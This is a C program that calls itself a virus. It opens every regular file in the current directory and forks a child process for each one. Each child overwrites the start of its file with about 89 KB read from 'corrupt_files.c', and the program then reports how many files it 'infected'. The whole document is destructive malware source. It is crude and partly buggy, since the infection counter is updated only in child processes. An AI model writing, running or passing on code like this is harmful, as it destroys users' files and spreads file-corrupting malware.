#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <dirent.h>
#include <time.h>
#include <unistd.h>  // For fork()

FILE *virus, *host;
int infected_files = 0;

unsigned long x;
char buffer[2048];
clock_t start, end;

void infect_file(const char *filename) {
    virus = fopen("corrupt_files.c", "rb"); // Replace with actual virus binary if needed
    host = fopen(filename, "rb+");
    if (host == NULL) {
        return;
    }

    x = 89088; // arbitrary size to copy
    printf("Infecting %s\n", filename);
    while (x > 2048) {
        fread(buffer, 2048, 1, virus);
        fwrite(buffer, 2048, 1, host);
        x -= 2048;
    }
    fread(buffer, x, 1, virus);
    fwrite(buffer, x, 1, host);
    infected_files++;

    fclose(host);
    fclose(virus);
}

int main() {
    struct dirent *entry;
    
    DIR *dir = opendir("."); // Open current directory

    if (dir == NULL) {
        printf("Error opening directory.\n");
        return 1;
    }

    start = clock();

    while ((entry = readdir(dir)) != NULL) {
        if (entry->d_type == DT_REG) { // Only process regular files

            // Skip the virus file itself
            if (strcmp(entry->d_name, "corrupt_files.c") == 0) {
                continue;
            }

            pid_t pid = fork(); // Create a child process

            if (pid < 0) {
                // Fork failed
                printf("Error forking.\n");
                exit(1);
            } else if (pid == 0) {
                // In child process
                infect_file(entry->d_name); // Infect the file
                exit(0); // Terminate child process after infection
            } else {
                // Parent process continues to next file
                continue;
            }
        }
    }

    closedir(dir);

    end = clock();
    printf("DONE! (Total Files Infected = %d)\n", infected_files);
    printf("TIME TAKEN = %f SEC\n", (double)(end - start) / CLOCKS_PER_SEC);

    return 0;
}
